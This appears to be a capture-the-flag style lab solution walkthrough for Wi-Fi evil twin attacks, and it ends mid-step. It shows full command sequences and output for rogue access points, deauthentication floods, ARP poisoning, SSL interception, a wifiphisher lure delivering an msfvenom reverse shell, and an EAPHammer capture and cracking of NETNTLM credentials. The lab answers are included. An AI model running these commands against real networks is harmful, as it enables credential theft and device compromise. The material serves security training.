└──╼ [★]$ xfreerdp /v:10.129.233.163 /u:wifi /p:wifi /dynamic-resolution 

[13:16:21:806] [260692:260693] [ERROR][com.winpr.timezone] - Unable to find a match for unix timezone: US/Central
[13:16:21:107] [260692:260693] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[13:16:21:107] [260692:260693] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[13:16:21:135] [260692:260693] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[13:16:21:135] [260692:260693] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[13:16:21:135] [260692:260693] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
```

Then, students need to enable monitor mode on the `wlan0` interface.

Code: shell

```shell
sudo airmon-ng start wlan0
```

```
wifi@Attica:~$ sudo airmon-ng start wlan0

[sudo] password for wifi: 

Found 4 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    180 avahi-daemon
    194 wpa_supplicant
    199 avahi-daemon
    210 NetworkManager

PHY	Interface	Driver		Chipset

phy1	wlan0		mac80211_hwsim	HTB Chipset of 802.11 radio(s) for mac80211
		(mac80211 monitor mode vif enabled for [phy1]wlan0 on [phy1]wlan0mon)
		(mac80211 station mode vif disabled for [phy1]wlan0)
phy2	wlan1		mac80211_hwsim	HTB Chipset of 802.11 radio(s) for mac80211
```

After enabling monitor mode, students need to scan for wireless networks using `airodump-ng`.

Code: shell

```shell
sudo airodump-ng wlan0mon -c 1
```

```
wifi@Attica:~$ sudo airodump-ng wlan0mon -c 1

[sudo] password for wifi: 

 CH  1 ][ Elapsed: 1 min ][ 2025-03-07 01:59 

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 02:00:00:00:02:00  -28   0      533       38    3   1   54   OPN              HTB-Wireless                                                                                                                      
 52:CD:8C:79:AD:87  -47   0     1054        0    0   1   54   WPA2 TKIP   PSK  HTB-Wireless                                                                                                                      

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 (not associated)   02:00:00:00:02:00  -29    0 - 1      0        2                                                                                                                                               
 (not associated)   02:00:00:00:05:00  -49    0 - 1      9       26                                                                                                                                               
 02:00:00:00:02:00  02:00:00:00:03:00  -29    6 -24      0       38                                                                                                                                               
 02:00:00:00:02:00  02:00:00:00:04:00  -29    0 -36      0       33              
```

In order to perform SSL interception, students must first become a man-in-the-middle. Therefore, students need to utilize a rogue access point, and subsequently have a client connect to it before SSL interception can occur.

For the first step, students need to configure the necessary routing. This includes the setting the IP address for `wlan1`, enabling IP forwarding, and creating the configuration file for DNS.

Code: shell

```shell
sudo sh -c "echo 1 > /proc/sys/net/ipv4/ip_forward"
sudo ifconfig wlan1 192.168.0.1/24
cat<< EOF > dns.conf
interface=wlan1
dhcp-range=192.168.0.2,192.168.0.254,255.255.255.0,10h
dhcp-option=3,192.168.0.1
dhcp-option=6,192.168.0.1
server=8.8.4.4
server=8.8.8.8
listen-address=127.0.0.1
address=/#/192.168.0.1
log-dhcp
log-queries
EOF
```

```
wifi@Attica:~$ sudo sh -c "echo 1 > /proc/sys/net/ipv4/ip_forward"

wifi@Attica:~$ sudo ifconfig wlan1 192.168.0.1/24

wifi@Attica:~$ cat<< EOF > dns.conf
interface=wlan1
dhcp-range=192.168.0.2,192.168.0.254,255.255.255.0,10h
dhcp-option=3,192.168.0.1
dhcp-option=6,192.168.0.1
server=8.8.4.4
server=8.8.8.8
listen-address=127.0.0.1
address=/#/192.168.0.1
log-dhcp
log-queries
EOF
```

After creating the `dns.conf` file, students need to run the DNS/DHCP server.

Code: shell

```shell
sudo dnsmasq -C dns.conf -d
```

```
wifi@Attica:~$ sudo dnsmasq -C dns.conf -d

dnsmasq: started, version 2.90 cachesize 150
dnsmasq: compile time options: IPv6 GNU-getopt DBus no-UBus i18n IDN2 DHCP DHCPv6 no-Lua TFTP conntrack ipset no-nftset auth cryptohash DNSSEC loop-detect inotify dumpfile
dnsmasq-dhcp: DHCP, IP range 192.168.0.2 -- 192.168.0.254, lease time 10h
dnsmasq: using nameserver 8.8.4.4#53
dnsmasq: using nameserver 8.8.8.8#53
dnsmasq: read /etc/hosts - 8 names
```

With the DNS server now active, students need to open a new terminal. Then, students need to create the configuration file for the rogue AP.

Code: shell

```shell
cat << EOF > hostapd.conf
interface=wlan1
hw_mode=g
ssid=HTB-Wireless
channel=1
driver=nl80211
```

```
wifi@Attica:~$ cat << EOF > hostapd.conf
interface=wlan1
hw_mode=g
ssid=HTB-Wireless
channel=1
driver=nl80211
EOF
```

Subsequently, students need to launch the rogue AP using the `hostapd.conf` configuration.

Code: shell

```shell
sudo hostapd hostapd.conf 
```

```
wifi@Attica:~$ sudo hostapd hostapd.conf 

rfkill: Cannot open RFKILL control device
wlan1: interface state UNINITIALIZED->ENABLED
wlan1: AP-ENABLED 
```

Now, students need to a client to connect. To achieve this, students need to deauthenticate the `HTB-Wireless` access point.

Code: shell

```shell
sudo aireplay-ng -0 10 -a 52:CD:8C:79:AD:87 wlan0mo
```

```
wifi@Attica:~$ sudo aireplay-ng -0 10 -a 52:CD:8C:79:AD:87 wlan0mon

02:00:31  Waiting for beacon frame (BSSID: 52:CD:8C:79:AD:87) on channel 1
NB: this attack is more effective when targeting a connected wireless client (-c <client's mac>).
02:00:32  Sending DeAuth (code 7) to broadcast -- BSSID: [52:CD:8C:79:AD:87]
02:00:32  Sending DeAuth (code 7) to broadcast -- BSSID: [52:CD:8C:79:AD:87]
02:00:32  Sending DeAuth (code 7) to broadcast -- BSSID: [52:CD:8C:79:AD:87]
02:00:33  Sending DeAuth (code 7) to broadcast -- BSSID: [52:CD:8C:79:AD:87]
02:00:33  Sending DeAuth (code 7) to broadcast -- BSSID: [52:CD:8C:79:AD:87]
02:00:34  Sending DeAuth (code 7) to broadcast -- BSSID: [52:CD:8C:79:AD:87]
02:00:34  Sending DeAuth (code 7) to broadcast -- BSSID: [52:CD:8C:79:AD:87]
02:00:35  Sending DeAuth (code 7) to broadcast -- BSSID: [52:CD:8C:79:AD:87]
02:00:35  Sending DeAuth (code 7) to broadcast -- BSSID: [52:CD:8C:79:AD:87]
02:00:36  Sending DeAuth (code 7) to broadcast -- BSSID: [52:CD:8C:79:AD:87]
```

After performing the deauthentication, students will see that two hosts have connected to the rogue access point.

```
<SNIP>
wlan1: interface state UNINITIALIZED->ENABLED
wlan1: AP-ENABLED 
wlan1: STA 02:00:00:00:03:00 IEEE 802.11: authenticated
wlan1: STA 02:00:00:00:03:00 IEEE 802.11: associated (aid 1)
wlan1: AP-STA-CONNECTED 02:00:00:00:03:00
wlan1: STA 02:00:00:00:03:00 RADIUS: starting accounting session 86D549FED7323F56
wlan1: STA 02:00:00:00:04:00 IEEE 802.11: authenticated
wlan1: STA 02:00:00:00:04:00 IEEE 802.11: associated (aid 2)
wlan1: AP-STA-CONNECTED 02:00:00:00:04:00
wlan1: STA 02:00:00:00:04:00 RADIUS: starting accounting session 2161EF47EDC0C06C
```

Having successfully achieved man-in-the-middle, students can now use `ettercap` for the SSL interception.

Code: shell

```shell
sudo ettercap -T -q -M ARP -i wlan1
```

```
wifi@Attica:~$ sudo ettercap -T -q -M ARP -i wlan1

<SNIP>

Randomizing 255 hosts for scanning...
Scanning the whole netmask for 255 hosts...
* |==================================================>| 100.00 %

2 hosts added to the hosts list...

ARP poisoning victims:

 GROUP 1 : ANY (all the hosts in the list)

 GROUP 2 : ANY (all the hosts in the list)
Starting Unified sniffing...

Text only Interface activated...
Hit 'h' for inline help

HTTP : 192.168.0.195:443 -> USER: admin  PASS: {hidden}  INFO: 192.168.0.195/received.php
CONTENT: username=admin&password={hidden}&submit=Sign+In
```

Examining the output from `ettercap`, students will discover the plaintext password.

Answer: `SSLinterc3ption`

# Wi-Fi Evil Twin Attacks - Skills Assessment

## Question 1

### "What is the password of the Wi-Fi network "PulseGrid-INT"?"

To begin, students need to connect to the target VM using remote desktop protocol, providing the credentials `wifi:wifi`.

Code: shell

```shell
xfreerdp /v:STMIP /u:wifi /p:wifi /dynamic-resolution
```

```
┌─[us-academy-4]─[10.10.14.139]─[htb-ac-594497@htb-fvtk5nch2h]─[~]
└──╼ [★]$ xfreerdp /v:10.129.233.163 /u:wifi /p:wifi /dynamic-resolution 

[13:16:21:806] [260692:260693] [ERROR][com.winpr.timezone] - Unable to find a match for unix timezone: US/Central
[13:16:21:107] [260692:260693] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[13:16:21:107] [260692:260693] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[13:16:21:135] [260692:260693] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[13:16:21:135] [260692:260693] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[13:16:21:135] [260692:260693] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
```

Then, students need to enable monitor mode on the `wlan0` interface.

Code: shell

```shell
sudo airmon-ng start wlan0
```

```
wifi@Attica:~$ sudo airmon-ng start wlan0

[sudo] password for wifi: 

Found 4 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    180 avahi-daemon
    194 wpa_supplicant
    199 avahi-daemon
    210 NetworkManager

PHY	Interface	Driver		Chipset

phy1	wlan0		mac80211_hwsim	HTB Chipset of 802.11 radio(s) for mac80211
		(mac80211 monitor mode vif enabled for [phy1]wlan0 on [phy1]wlan0mon)
		(mac80211 station mode vif disabled for [phy1]wlan0)
phy2	wlan1		mac80211_hwsim	HTB Chipset of 802.11 radio(s) for mac80211
```

After enabling monitor mode, students need to scan for wireless networks using `airodump-ng`.

Code: shell

```shell
sudo airodump-ng wlan0mon -c 1
```

```
wifi@Attica:~$ sudo airodump-ng wlan0mon -c 1

 CH  7 ][ Elapsed: 2 mins ][ 2025-03-08 00:01 ]

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 82:EE:F5:63:E4:DA  -28     1210        0    0   1   54   WPA2 CCMP   MGT  PulseGrid-ENT                                                                                                                         
 D8:D3:2D:EB:29:D6  -28     1210       28    0   1   54   WPA2 CCMP   PSK  PulseGrid-INT                                                                                                                         
 52:DC:8C:79:EB:87  -28     1210       44    0   1   54   WPA3 CCMP   SAE  PulseGrid                                                                                                                             

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 (not associated)   F6:B7:D4:5F:61:8B  -29    0 - 1      0      392                                                                                                                                               
 (not associated)   56:A7:C7:A4:BE:0B  -49    0 - 1     36      796         PulseGrid-INT                                                                                                                         
 (not associated)   D2:24:A7:AA:DE:D6  -49    0 - 1      0       31                                                                                                                                               
 (not associated)   00:11:22:33:44:00  -29    0 - 1      0       35                                                                                                                                               
 D8:D3:2D:EB:29:D6  1A:1F:02:46:51:79  -29    0 -54      0       17         PulseGrid-INT                                                                                                                         
 52:DC:8C:79:EB:87  A6:1D:3A:43:54:14  -29    1 - 1     65      510       PulseGrid                                              
```

Examining the output of the scan, students will see that the `PulseGrid-INT` network is using WPA2 with a pre-shared key `AUTH` type. Additionally, students should note that there is one client connected to `PulseGrid-INT`, and another client transmitting probes for it.

Recalling a similar scenario in the [SSL Interception](https://academy.hackthebox.com/module/291/section/3285) section (and possibly seeing the clue within the name "PulseGride-INT"), students need prepare for an SSL Interception attack. To begin, students must configure the necessary routing, and also create the configuration file for the DNS server.

Code: shell

```shell
sudo sh -c "echo 1 > /proc/sys/net/ipv4/ip_forward"
sudo ifconfig wlan1 192.168.0.1/24
cat<< EOF > dns.conf
interface=wlan1
dhcp-range=192.168.0.2,192.168.0.254,255.255.255.0,10h
dhcp-option=3,192.168.0.1
dhcp-option=6,192.168.0.1
server=8.8.4.4
server=8.8.8.8
listen-address=127.0.0.1
address=/#/192.168.0.1
log-dhcp
log-queries
EOF
```

```
wifi@Attica:~$ sudo sh -c "echo 1 > /proc/sys/net/ipv4/ip_forward"

wifi@Attica:~$ sudo ifconfig wlan1 192.168.0.1/24

wifi@Attica:~$ cat<< EOF > dns.conf
interface=wlan1
dhcp-range=192.168.0.2,192.168.0.254,255.255.255.0,10h
dhcp-option=3,192.168.0.1
dhcp-option=6,192.168.0.1
server=8.8.4.4
server=8.8.8.8
listen-address=127.0.0.1
address=/#/192.168.0.1
log-dhcp
log-queries
EOF
```

After creating the `dns.conf` file, students need to run the DNS/DHCP server,

Code: shell

```shell
sudo dnsmasq -C dns.conf -d
```

```
wifi@Attica:~$ sudo dnsmasq -C dns.conf -d

dnsmasq: started, version 2.90 cachesize 150
dnsmasq: compile time options: IPv6 GNU-getopt DBus no-UBus i18n IDN2 DHCP DHCPv6 no-Lua TFTP conntrack ipset no-nftset auth cryptohash DNSSEC loop-detect inotify dumpfile
dnsmasq-dhcp: DHCP, IP range 192.168.0.2 -- 192.168.0.254, lease time 10h
dnsmasq: using nameserver 8.8.4.4#53
dnsmasq: using nameserver 8.8.8.8#53
dnsmasq: read /etc/hosts - 8 names
```

With the DNS server now active, students need to open a new terminal. Then, students need to create the configuration file for the rogue AP.

Code: shell

```shell
cat << EOF > hostapd.conf
interface=wlan1
hw_mode=g
ssid=PulseGrid-INT
channel=1
driver=nl80211
EOF
```

```
wifi@Attica:~$ cat << EOF > hostapd.conf
interface=wlan1
hw_mode=g
ssid=PulseGrid-INT
channel=1
driver=nl80211
EOF
```

Subsequently, students need to launch the rogue AP using the `hostapd.conf` configuration.

Code: shell

```shell
sudo hostapd hostapd.conf 
```

```
wifi@Attica:~$ sudo hostapd hostapd.conf 

rfkill: Cannot open RFKILL control device
wlan1: interface state UNINITIALIZED->ENABLED
wlan1: AP-ENABLED 
```

Almost immediately, students will see a client connect to the Evil-Twin. However, the client connected to the legitimate access point may not. Therefore, students need need to use `aireplay-ng` to deauthenticate the client. `Note: The BSSID of the client may differ than the example shown below.`

Code: shell

```shell
sudo aireplay-ng -0 5 -a D8:D3:2D:EB:29:D6 -c <CLIENT_MC> wlan0mon
```

```
wifi@Attica:~$ sudo aireplay-ng -0 5 -a D8:D3:2D:EB:29:D6 -c 1A:1F:02:46:51:79 wlan0mon

17:12:25  Waiting for beacon frame (BSSID: D8:D3:2D:EB:29:D6) on channel 1
17:12:26  Sending 64 directed DeAuth (code 7). STMAC: [1A:1F:02:46:51:79] [ 0| 0 ACKs]
17:12:26  Sending 64 directed DeAuth (code 7). STMAC: [1A:1F:02:46:51:79] [ 0| 0 ACKs]
17:12:27  Sending 64 directed DeAuth (code 7). STMAC: [1A:1F:02:46:51:79] [ 0| 0 ACKs]
17:12:27  Sending 64 directed DeAuth (code 7). STMAC: [1A:1F:02:46:51:79] [ 0| 0 ACKs]
17:12:28  Sending 64 directed DeAuth (code 7). STMAC: [1A:1F:02:46:51:79] [ 0| 0 ACKs]
```

When the client attempts to reconnect to the `PulseGrid-INT` access point, it will instead associate with the Evil-Twin. After which, students need to use `ettercap` to become a man-in-the-middle, intercepting communication between the two clients.

Code: shell

```shell
sudo ettercap -T -q -M ARP -i wlan1
```

```
wifi@Attica:~$ sudo ettercap -T -q -M ARP -i wlan1

ettercap 0.8.3.1 copyright 2001-2020 Ettercap Development Team

Listening on:
 wlan1 -> 00:11:22:33:44:00
	  192.168.0.1/255.255.255.0

<SNIP>

Randomizing 255 hosts for scanning...
Scanning the whole netmask for 255 hosts...
* |==================================================>| 100.00 %

2 hosts added to the hosts list...

ARP poisoning victims:

 GROUP 1 : ANY (all the hosts in the list)

 GROUP 2 : ANY (all the hosts in the list)
Starting Unified sniffing...

Text only Interface activated...
Hit 'h' for inline help

HTTP : 192.168.0.25:443 -> USER:   PASS: {hidden}  INFO: 192.168.0.25/received.php
CONTENT: password={hidden}&submit=Sign+In
```

After intercepting and stripping the SSL, students will find the password in cleartext.

Answer: `Puls3Gr3dSecured`

# Wi-Fi Evil Twin Attacks - Skills Assessment

## Question 2

### "Compromise a client device on the "PulseGrid" Wi-Fi network and submit the value of flag.txt."

Using the previously established RDP session, students need to reset the wireless interfaces on the target VM. Once reset, students need to enable monitor mode on `wlan0`.

Code: shell

```shell
sudo systemctl restart NetworkManager
sudo airmon-ng start wlan0
```

```
wifi@Attica:~$ sudo systemctl restart NetworkManager
wifi@Attica:~$ sudo airmon-ng start wlan0

Found 4 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    180 avahi-daemon
    194 wpa_supplicant
    199 avahi-daemon
    644 NetworkManager

PHY	Interface	Driver		Chipset

phy1	wlan0		mac80211_hwsim	HTB Chipset of 802.11 radio(s) for mac80211
		(mac80211 monitor mode vif enabled for [phy1]wlan0 on [phy1]wlan0mon)
		(mac80211 station mode vif disabled for [phy1]wlan0)
phy2	wlan1		mac80211_hwsim	HTB Chipset of 802.11 radio(s) for mac80211
phy6	wlan2		mac80211_hwsim	HTB Chipset of 802.11 radio(s) for mac80211
```

Then, students need to use `airodump-ng` to scan for wireless networks, providing the `-w` option to save the results.

```shell
sudo airodump-ng wlan0mon -w HTB -c 1
```
```
wifi@Attica:~$ sudo airodump-ng wlan0mon -w HTB -c 1

 CH  1 ][ Elapsed: 5 mins ][ 2025-03-07 23:31 ]

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 82:EE:F5:63:E4:DA  -28      245        0    0   1   54   WPA2 CCMP   MGT  PulseGrid-ENT                                                                                                                         
 52:DC:8C:79:EB:87  -28      245       10    0   1   54   WPA3 CCMP   SAE  PulseGrid                                                                                                                             
 D8:D3:2D:EB:29:D6  -28      245        6    0   1   54   WPA2 CCMP   PSK  PulseGrid-INT                                                                                                                         

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 (not associated)   F6:B7:D4:5F:61:8B  -49    0 - 1     10       66                                                                                                                                               
 (not associated)   56:A7:C7:A4:BE:0B  -49    0 - 1      0      138         PulseGrid-INT                                                                                                                         
 (not associated)   D2:24:A7:AA:DE:D6  -49    0 - 1      0       14                                                                                                                                               
 (not associated)   2A:09:F2:D4:CE:AE  -49    0 - 1      0       14                                                                                                                                               
 52:DC:8C:79:EB:87  A6:1D:3A:43:54:14  -29    0 - 1     24       80         PulseGrid                                                                                                                             
 D8:D3:2D:EB:29:D6  1A:1F:02:46:51:79  -29    0 -54      0        4         PulseGrid-INT                                                                      
```

Student will observe that the `PulseGrid` wireless network is using WPA3. Therefore, students need to configure a rogue AP for the MANA attack.

```shell
cat <<EOF > hostapd.conf
ssid=PulseGrid
interface=wlan1
channel=1
hw_mode=g
# Mana Attack Configuration
enable_mana=1
mana_loud=1
# WPA AP Configuration
wpa=2
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
wpa_passphrase=PSKmismatchmaker
EOF
```
```
wifi@Attica:~$ cat <<EOF > hostapd.conf
ssid=PulseGrid
interface=wlan1
channel=1
hw_mode=g
# Mana Attack Configuration
enable_mana=1
mana_loud=1
# WPA AP Configuration
wpa=2
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
wpa_passphrase=PSKmismatchmaker
EOF
```

However, knowing that the task is to achieve remote code execution, students should recall the Plugin Update phishing attack used in the \[WifiPhisher\] section. Therefore, students need to create a reverse shell payload, then begin listening with netcat.

```shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf > shell.elf
nc -lvnp 4444
```
```
wifi@Attica:~$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf > shell.elf

Would you like to use and setup a new database (recommended)? yes
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes

wifi@Attica:~$ nc -lvnp 4444

Listening on 0.0.0.0 4444
```

Now, students need to configure the MAC address of the `wlan1` interface, using the same MAC as the legitimate access point. Then, students need to launch the rogue AP.

```shell
sudo ifconfig wlan1 down
sudo macchanger -m 52:DC:8C:79:EB:87 wlan1
sudo ifconfig wlan1 up
sudo hostapd-mana hostapd.conf
```
```
wifi@Attica:~$ sudo ifconfig wlan1 down
wifi@Attica:~$ sudo macchanger -m 52:DC:8C:79:EB:87 wlan1

Current MAC:   ba:c6:62:85:cf:92 (unknown)
Permanent MAC: 02:00:00:00:02:00 (unknown)
New MAC:       52:dc:8c:79:eb:87 (unknown)

wifi@Attica:~$ sudo ifconfig wlan1 up
wifi@Attica:~$ sudo hostapd-mana hostapd.conf

Configuration file: hostapd.conf
Using interface wlan1 with hwaddr 52:dc:8c:79:eb:87 and ssid "PulseGrid"
wlan1: interface state UNINITIALIZED->ENABLED
wlan1: AP-ENABLED
```

With the AP now running on `wlan1`, students need to launch `wifiphisher`, specifying the Plugin Update attack and using interfaces `wlan0` and `wlan2` for deauthentication / hosting the open access point.

```shell
sudo wifiphisher -aI wlan2 -eI wlan0mon -p plugin_update  --payload-path /home/wifi/shell.elf -kN
```
```
wifi@Attica:~$ sudo wifiphisher -aI wlan2 -eI wlan0mon -p plugin_update  --payload-path /home/wifi/shell.elf -kN

Authorization required, but no authorization protocol specified
<SNIP>
```

Students need to wait several minutes as clients will eventually begin to connect. Students also need to periodically check terminal in which `hostapd-mana` is running, making sure to re-launch the rogue AP in the event the process dies.

At the same time, students need to keep an eye on `wifiphisher`, being on the lookout for an HTTP request.

![[HTB Solutions/Others/z. images/2e8f174cb14f2f5ae479b55075d65813_MD5.jpg]]

Once the request is made, students need to check their netcat terminal. After a few more minutes, a connection will appear, allowing students to read the contents of the flag.

```shell
cat flag.txt
```
```
Listening on 0.0.0.0 4444

Connection received on 10.0.0.69 39196
cat flag.txt
HTB{hidden}
```

Answer: `HTB{WPA3_Client_R3mote_Cod3_Ex3cutiON}`

# Wi-Fi Evil Twin Attacks - Skills Assessment

## Question 3

### "What credentials are obtained from the Wi-Fi network "PulseGrid-ENT" (format: username:password)?"

Using the previously established RDP session, students need to reset the wireless interfaces on the target VM. Once reset, students need to enable monitor mode on `wlan0`.

```shell
sudo systemctl restart NetworkManager
sudo airmon-ng start wlan0
```
```
wifi@Attica:~$ sudo systemctl restart NetworkManager
wifi@Attica:~$ sudo airmon-ng start wlan0

Found 4 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    180 avahi-daemon
    194 wpa_supplicant
    199 avahi-daemon
    644 NetworkManager

PHY	Interface	Driver		Chipset

phy1	wlan0		mac80211_hwsim	HTB Chipset of 802.11 radio(s) for mac80211
		(mac80211 monitor mode vif enabled for [phy1]wlan0 on [phy1]wlan0mon)
		(mac80211 station mode vif disabled for [phy1]wlan0)
phy2	wlan1		mac80211_hwsim	HTB Chipset of 802.11 radio(s) for mac80211
phy6	wlan2		mac80211_hwsim	HTB Chipset of 802.11 radio(s) for mac80211
```

Then, students need to use `airodump-ng` to scan for wireless networks, providing the `-w` option to save the results.

```shell
sudo airodump-ng wlan0mon -w HTB -c 1
```
```
wifi@Attica:~$ sudo airodump-ng wlan0mon -w HTB -c 1

 CH  1 ][ Elapsed: 5 mins ][ 2025-03-07 23:31 ]

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 82:EE:F5:63:E4:DA  -28      245        0    0   1   54   WPA2 CCMP   MGT  PulseGrid-ENT                                                                                                                         
 52:DC:8C:79:EB:87  -28      245       10    0   1   54   WPA3 CCMP   SAE  PulseGrid                                                                                                                             
 D8:D3:2D:EB:29:D6  -28      245        6    0   1   54   WPA2 CCMP   PSK  PulseGrid-INT                                                                                                                         

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 (not associated)   F6:B7:D4:5F:61:8B  -49    0 - 1     10       66                                                                                                                                               
 (not associated)   56:A7:C7:A4:BE:0B  -49    0 - 1      0      138         PulseGrid-INT                                                                                                                         
 (not associated)   D2:24:A7:AA:DE:D6  -49    0 - 1      0       14                                                                                                                                               
 (not associated)   2A:09:F2:D4:CE:AE  -49    0 - 1      0       14                                                                                                                                               
 52:DC:8C:79:EB:87  A6:1D:3A:43:54:14  -29    0 - 1     24       80         PulseGrid                                                                                                                             
 D8:D3:2D:EB:29:D6  1A:1F:02:46:51:79  -29    0 -54      0        4         PulseGrid-INT                                                                    
```

Examining the results the scan, students will see that the `PulseGrid-ENT` network has an `AUTH` type of `MGT`, indicating that it is using WPA2 Enterprise. Students will also observe that there are no clients associated to it, and therefore a handshake cannot be captured.

Given that the task is to acquire the `username:password` of a client (rather than a network password), student's may recall a similar scenario in the [EAPHammer](https://academy.hackthebox.com/module/291/section/3285) section. Therefore, students first need to generate the certificates needed for hosting a WPA2 Enterprise access point.

```shell
sudo /opt/eaphammer/eaphammer --cert-wizard
```
```
wifi@Attica:~$ sudo /opt/eaphammer/eaphammer --cert-wizard

<SNIP>

[*] Please enter two letter country code for certs (i.e. US, FR)
: US
[*] Please enter state or province for certs (i.e. Ontario, New Jersey)
: California
[*] Please enter locale for certs (i.e. London, Hong Kong)
: San Francisco
[*] Please enter organization for certs (i.e. Evil Corp)
: PulseGrid Systems
[*] Please enter org unit for certs (i.e. Hooman Resource Says)
: PulseGrid
[*] Please enter email for certs (i.e. cyberz@h4x0r.lulz)
: admin@pulsegridsystems.com
[*] Please enter common name (CN) for certs.
: PulseGrid Systems
[CW] Creating CA cert and key pair...
[CW] Complete!
[CW] Writing CA cert and key pair to disk...
[CW] New CA cert and private key written to: /opt/eaphammer/certs/ca/PulseGrid Systems.pem
[CW] Complete!
[CW] Creating server private key...
[CW] Complete!
[CW] Using server private key to create CSR...
[CW] Complete!
[CW] Creating server cert using CSR and signing it with CA key...
[CW] Complete!
[CW] Writing server cert and key pair to disk...
[CW] Complete!
[CW] Activating full certificate chain...
[CW] Complete!
```

Then, students need to start the rogue AP, using `eaphammer` with ESSID stripping to further imitate the legitimate access point.

```shell
sudo /opt/eaphammer/eaphammer -i wlan1 --auth wpa-eap --essid PulseGrid-ENT --creds --negotiate balanced  --essid-stripping '\t'
```
```
wifi@Attica:~$ sudo /opt/eaphammer/eaphammer -i wlan1 --auth wpa-eap --essid PulseGrid-ENT --creds --negotiate balanced  --essid-stripping '\t'

<SNIP>

[*] WPA handshakes will be saved to /opt/eaphammer/loot/wpa_handshake_capture-2025-03-07-23-38-52-6hGU1GdGSF7m5LMaZVincMeii2byFOo4.hccapx

[hostapd] AP starting...

Configuration file: /opt/eaphammer/tmp/hostapd-2025-03-07-23-38-52-DpBQ5Uio9mhf4UuMdCX0JT4jNfzryl4D.conf
wlan1: interface state UNINITIALIZED->COUNTRY_UPDATE
Using interface wlan1 with hwaddr 00:11:22:33:44:00 and ssid "PulseGrid-ENT\t"
wlan1: interface state COUNTRY_UPDATE->ENABLED
wlan1: AP-ENABLED 
```

After a few moments, students will see a client authenticate to the rogue AP.

```
wlan1: STA f6:b7:d4:5f:61:8b IEEE 802.11: authenticated
wlan1: STA f6:b7:d4:5f:61:8b IEEE 802.11: associated (aid 1)
wlan1: CTRL-EVENT-EAP-STARTED f6:b7:d4:5f:61:8b
wlan1: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=1
wlan1: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=25

mschapv2: Fri Mar  7 23:38:59 2025
	 domain\username:		PulseGrid\John
	 username:			John
	 challenge:			ef:df:7b:e5:ee:ad:37:03
	 response:			33:2f:d1:16:42:58:ea:46:ed:b4:ec:22:3e:6d:3b:76:32:cc:41:69:a3:5a:e8:b6

	 jtr NETNTLM:			John:$NETNTLM$efdf7be5eead3703$332fd1164258ea46edb4ec223e6d3b7632cc4169a35ae8b6

	 hashcat NETNTLM:		John::::332fd1164258ea46edb4ec223e6d3b7632cc4169a35ae8b6:efdf7be5eead3703
```

Students will see that the EAP downgrade results in `mschapv2` authentication, resulting in the `NETNTLM` hash of the user `John`. To discover the plaintext password, students need to use `hashcat`.

However, due to an error with CPU drivers, students need to run `hashcat` from the Pwnbox. Consequently, the dictionary file located at `/opt/wordlist.txt` must be transferred as well.

Students need to start the SSH service on the target VM, so that `scp` may be used.

```shell
sudo service ssh start 
```
```
wifi@Attica:~$ sudo service ssh start
```

Then, `scp` can be ran from the Pwnbox.

```shell
scp wifi@STMUP:/opt/wordlist.txt .
```
```
┌─[us-academy-3]─[10.10.15.111]─[htb-ac-594497@htb-79efu8qf0t]─[~]
└──╼ [★]$ scp wifi@10.129.233.195:/opt/wordlist.txt .

The authenticity of host '10.129.233.195 (10.129.233.195)' can't be established.
ED25519 key fingerprint is SHA256:fQcBrQA+XN0iu2Eikzu7UWJpc+KT4J6vQV/ptEQSQos.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.233.195' (ED25519) to the list of known hosts.

wifi@10.129.233.195's password: 
wordlist.txt                                  100%  133MB   4.3MB/s   00:31 
```

With the `wordlist.txt` now available, students need crack the hash with `hashcat`.

```shell
hashcat -m 5500 -a 0 John::::332fd1164258ea46edb4ec223e6d3b7632cc4169a35ae8b6:efdf7be5eead3703 wordlist.txt
```
```
┌─[us-academy-3]─[10.10.15.111]─[htb-ac-594497@htb-79efu8qf0t]─[~]
